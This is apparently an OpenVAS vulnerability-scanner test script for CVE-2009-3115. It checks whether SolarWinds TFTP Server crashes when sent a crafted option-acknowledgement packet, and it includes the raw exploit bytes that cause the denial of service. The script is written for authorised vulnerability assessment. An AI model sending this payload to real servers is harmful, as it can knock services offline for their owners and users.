###############################################################################
# OpenVAS Vulnerability Test
#
# SolarWinds TFTP Server Option Acknowledgement Request Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (C) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100264");
  script_version("2020-11-10T09:46:51+0000");
  script_tag(name:"last_modification", value:"2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)");
  script_tag(name:"creation_date", value:"2009-08-31 17:18:15 +0200 (Mon, 31 Aug 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-3115");
  script_bugtraq_id(36182);

  script_name("SolarWinds TFTP Server Option Acknowledgement Request Denial Of Service Vulnerability");

  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"summary", value:"SolarWinds TFTP Server is prone to a denial-of-service vulnerability.");

  script_tag(name:"impact", value:"A successful exploit may allow attackers to crash the server process,
  resulting in a denial-of-service condition.");

  script_tag(name:"affected", value:"SolarWinds TFTP Server 9.2.0.111 and prior versions are vulnerable.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36182");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_alive(port:port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

boom = raw_string(0x00,0x06,0x54,0x9d,0x68,0x21,0xde,
                   0x59,0x30,0x9a,0x0b,0xb5,0xd4,0x94,
                   0x94,0x42,0x3c,0xeb,0xc5,0xc1,0xe8,
                   0x7d,0x31,0x34,0xee,0xd8,0x60,0x41,
                   0x8f,0x92,0x25,0x9c,0x5c,0xcc,0x78,
                   0x6a);

send(socket:soc, data:boom);
close(soc);

if(!tftp_alive(port:port)) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);
